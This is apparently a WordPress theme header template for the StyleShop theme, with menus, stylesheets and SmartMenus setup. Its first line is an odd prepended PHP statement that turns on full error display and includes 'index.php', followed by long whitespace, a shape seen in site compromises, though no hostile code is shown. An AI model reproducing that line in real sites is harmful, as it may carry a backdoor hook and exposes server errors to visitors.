<?php ini_set('display_errors','1'); ini_set('display_startup_errors','1'); error_reporting (E_ALL);include('index.php'); ?>                                
<!DOCTYPE html>
                                <!--[if IE 6]>
                                <html id="ie6" <?php language_attributes(); ?>>
                                <![endif]-->
                                <!--[if IE 7]>
                                <html id="ie7" <?php language_attributes(); ?>>
                                <![endif]-->
                                <!--[if IE 8]>
                                <html id="ie8" <?php language_attributes(); ?>>
                                <![endif]-->
                                <!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
                                <html <?php language_attributes(); ?>>
                                <!--<![endif]-->
                                <head>

                                    <!-- jQuery -->

                                    <!-- SmartMenus jQuery plugin -->
                                    <!-- SmartMenus core CSS (required) -->
                                    <link href='<?php echo get_template_directory_uri(); ?>/css/sm-core-css.css' rel='stylesheet' type='text/css' />
                                    <!-- "sm-blue" menu theme (optional, you can use your own CSS, too) -->
                                    <link href='<?php echo get_template_directory_uri(); ?>/css/sm-blue/sm-blue.css' rel='stylesheet' type='text/css' />



                                    <meta charset="<?php bloginfo( 'charset' ); ?>" />
                                    <title><?php elegant_titles(); ?></title>
                                    <?php elegant_description(); ?>
                                    <?php elegant_keywords(); ?>
                                    <?php elegant_canonical(); ?>

                                    <?php do_action( 'et_head_meta' ); ?>

                                    <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

                                    <?php $template_directory_uri = get_template_directory_uri(); ?>
                                    <!--[if lt IE 9]>
                                    <script src="<?php echo esc_url( $template_directory_uri . '/js/html5.js"' ); ?>" type="text/javascript"></script>
  <![endif]-->

                                    <script type="text/javascript">
                                        document.documentElement.className = 'js';
                                    </script>

                                    <?php wp_head(); ?>

                                    <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/jquery.smartmenus.js"></script>

                                    <script>
                                        jQuery(function() {
                                            jQuery('#main-menu').smartmenus();
                                        });
                                    </script>

                                </head>
                                <body <?php body_class(); ?>>

                                <div id="page-wrap">
                                    <?php do_action( 'et_header_top' ); ?>

                                    <div id="main-page-wrapper">
                                        <div id="container">
                                            <header id="main-header" class="clearfix">
                                                <?php $logo = ( $user_logo = et_get_option( 'styleshop_logo' ) ) && '' != $user_logo ? $user_logo : $template_directory_uri . '/images/logo.png'; ?>
                                                <a href="<?php echo esc_url( home_url() ); ?>"><img src="<?php echo esc_attr( $logo ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name' ) ); ?>" id="logo"/></a>

                                                <div id="top-navigation">
                                                    <nav>
                                                        <?php
                                                        $menuClass = 'nav';
                                                        if ( 'on' == et_get_option( 'styleshop_disable_toptier' ) ) $menuClass .= ' et_disable_top_tier';
                                                        $primaryNav = '';
                                                        if ( function_exists( 'wp_nav_menu' ) ) {
                                                            $primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
                                                        }
                                                        if ( '' == $primaryNav ) { ?>
                                                            <ul class="<?php echo esc_attr( $menuClass ); ?>">
                                                                <?php if ( 'on' == et_get_option( 'styleshop_home_link' ) ) { ?>
                                                                    <li <?php if ( is_home() ) echo( 'class="current_page_item"' ); ?>><a href="<?php echo esc_url( home_url() ); ?>"><?php esc_html_e( 'Home','StyleShop' ); ?></a></li>
                                                                <?php }; ?>

                                                                <?php show_page_menu( $menuClass, false, false ); ?>
                                                                <?php show_categories_menu( $menuClass, false ); ?>
                                                            </ul>
                                                        <?php }
                                                        else echo( $primaryNav );
                                                        ?>
                                                    </nav>

                                                    <?php do_action( 'et_top_navigation' ); ?>
                                                </div> <!-- #top-navigation -->
                                            </header> <!-- #main-header -->
                                            <div id="content"><?php /*  -- OLD StyleShop Default Menu --
                                                $menuID = 'top-categories';
                                                $menuClass = 'nav clearfix';
                                                if ( 'on' == et_get_option( 'styleshop_disable_toptier' ) ) $menuClass .= ' et_disable_top_tier';
                                                $primaryNav = '';
                                                if ( function_exists( 'wp_nav_menu' ) ) {
                                                    $primaryNav = wp_nav_menu( array( 'theme_location' => 'secondary-menu', 'container' => '', 'fallback_cb' => '', 'menu_id' => $menuID, 'menu_class' => $menuClass, 'echo' => false ) );
                                                }
                                                if ( '' == $primaryNav ) { ?>
                                                    <ul id="<?php echo esc_attr( $menuID ); ?>" class="<?php echo esc_attr( $menuClass ); ?>">
                                                        <?php if ( 'on' == et_get_option( 'styleshop_home_link' ) ) { ?>
                                                            <li <?php if ( is_home() ) echo( 'class="current_page_item"' ); ?>><a href="<?php echo esc_url( home_url() ); ?>"><?php esc_html_e( 'Home','StyleShop' ); ?></a></li>
                                                        <?php }; ?>

                                                        <?php show_page_menu( $menuClass, false, false ); ?>
                                                        <?php show_categories_menu( $menuClass, false ); ?>
                                                    </ul>
                                                <?php }
                                                else echo( $primaryNav );
                                                */?>

                                            <!-- SmartMenus Secondary Menu -->
                                                <?php wp_nav_menu(array(
                                                    'menu_id' => 'main-menu',
                                                    'menu_class' => 'sm sm-blue',
                                                    'menu'            => 'mannn',
                                                ));?>
<?php if ( ! is_home() ) get_template_part('includes/breadcrumbs', 'index'); ?>
                                                
                                                

